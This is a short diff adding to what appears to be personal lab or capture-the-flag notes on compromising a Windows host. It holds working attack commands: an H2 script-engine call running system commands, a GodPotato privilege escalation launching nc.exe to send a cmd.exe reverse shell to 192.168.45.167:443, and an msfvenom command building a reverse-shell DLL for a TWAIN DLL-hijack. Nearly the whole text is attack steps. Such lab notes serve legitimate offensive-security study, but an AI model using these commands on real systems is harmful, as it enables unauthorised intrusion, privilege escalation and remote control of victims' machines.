@@ -26,3 +26,13 @@ CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().
 
 whoami /priv shows SeImpersonatePrivilege -> printspoofer
 <img width="837" height="258" alt="image" src="https://github.com/user-attachments/assets/8aa642e8-1599-4e9e-bfc8-6ff42f8dd920" />
+
+printspoofer DID NOT work. used godpotato
+
+in tony desktop powershell
+./GodPotato-NET4.exe -cmd "./nc.exe -e cmd.exe 192.168.45.167 443"
+
+alternative twain dll
+msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.167 LPORT=443 -o UninOldIS.dll
+put the twain exploit + dll into \windows\temp
+and run
